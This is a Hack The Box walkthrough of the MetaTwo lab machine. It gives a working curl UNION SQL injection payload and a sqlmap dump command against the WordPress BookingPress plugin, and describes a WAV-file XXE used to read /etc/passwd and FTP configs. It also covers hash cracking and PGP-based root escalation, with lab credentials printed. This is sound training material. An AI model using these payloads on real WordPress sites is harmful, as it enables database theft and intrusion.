---
title: "MetaTwo — Hack The Box Walkthrough"
description: "Full attack chain on MetaTwo: WordPress SQLi, XXE exploitation, and passpie privilege escalation."
date: 2026-09-01
category: offensive
readTime: "10 min read"
mitre:
  - "T1190"
  - "T1068"
tags:
  - "Hack The Box"
  - "WordPress"
  - "SQL Injection"
  - "XXE"
  - "CVE-2022-0739"
  - "CVE-2021-29447"
  - "passpie"
  - "PGP"
  - "Linux"
  - "CTF"
summary: "Full attack chain on MetaTwo: WordPress SQLi, XXE exploitation, and passpie privilege escalation."
---

**Machine:** MetaTwo
**Difficulty:** Easy
**Key Techniques:** BookingPress SQLi (CVE-2022-0739), WordPress XXE (CVE-2021-29447), FTP credential leak, passpie/PGP privesc

---

## Enumeration

### Port Scanning

```bash
nmap -sV -p 21,22,80 10.129.228.95
```

| Port | Service | Version |
|------|---------|---------|
| 21 | ftp | filtered |
| 22 | ssh | OpenSSH 8.4p1 Debian |
| 80 | http | nginx 1.18.0 |

Port 80 redirects to **http://metapress.htb/**. Add it to `/etc/hosts`:

```bash
echo "10.129.228.95 metapress.htb" >> /etc/hosts
```

The site is **WordPress 5.6.2** powered by the **BookingPress** appointment-booking plugin.

---

## Exploitation

### BookingPress SQL Injection (CVE-2022-0739)

The BookingPress plugin (pre-1.0.11) is vulnerable to unauthenticated SQL injection via the AJAX endpoint.

Capture a valid `_wpnonce` from the site, then inject:

```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' \
  --data 'action=bookingpress_front_get_category_services&_wpnonce=<nonce>&category_id=33&total_service=-75 UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6,7,8,9-- -'
```

Automate with `sqlmap` to dump `wp_users`:

```bash
sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data="action=bookingpress_front_get_category_services&_wpnonce=<nonce>&category_id=33" --dump -T wp_users -D wordpress
```

Two password hashes found. Crack the `manager` user's hash:

```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt -m 400
```

Login to `wp-admin` as `manager`.

### WordPress XXE (CVE-2021-29447)

WordPress 5.6.2 is vulnerable to out-of-band XXE via the media upload endpoint. Craft a malicious WAV file with an embedded DTD payload pointing to your attacker server.

Upload the WAV file and read files from the server via the XXE callback:

- Read `/etc/passwd` → reveals user `jnelson`
- Read FTP config files → reveals credentials: `metapress.htb:9NYS_ii@FyL_p5M2NvJ`

### Foothold

```bash
ftp metapress.htb
# Login: metapress.htb / 9NYS_ii@FyL_p5M2NvJ
```

Download a PHP file from FTP containing **plaintext SSH credentials** for `jnelson`.

```bash
ssh jnelson@10.129.228.95
```

User flag:

```
user.txt: <flag>
```

---

## Privilege Escalation

### Passpie + PGP Decryption

In `jnelson`'s home directory, a hidden `.passpie` directory contains PGP keys and an encrypted `root.pass` file holding the root password.

Extract a crackable hash from the private key:

```bash
gpg2john private.key > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Passphrase:** `blink182`

Decrypt the root password:

```bash
gpg --import private.key
gpg --decrypt root.pass
# root password revealed
```

```bash
su root
# Enter the decrypted password
```

```
root.txt: <flag>
```

---

## Lessons Learned

1. **Patch outdated software.** The BookingPress SQLi, WordPress XXE, and outdated components are all fixed by updates.
2. **Remove default/weak plugin configurations.** Monitor installed plugins and versions.
3. **Never store plaintext SSH credentials** in files accessible over FTP. Use SSH keys and a secrets manager.
4. **Use strong passphrases for PGP keys** protecting root credentials — `blink182` was trivially crackable.
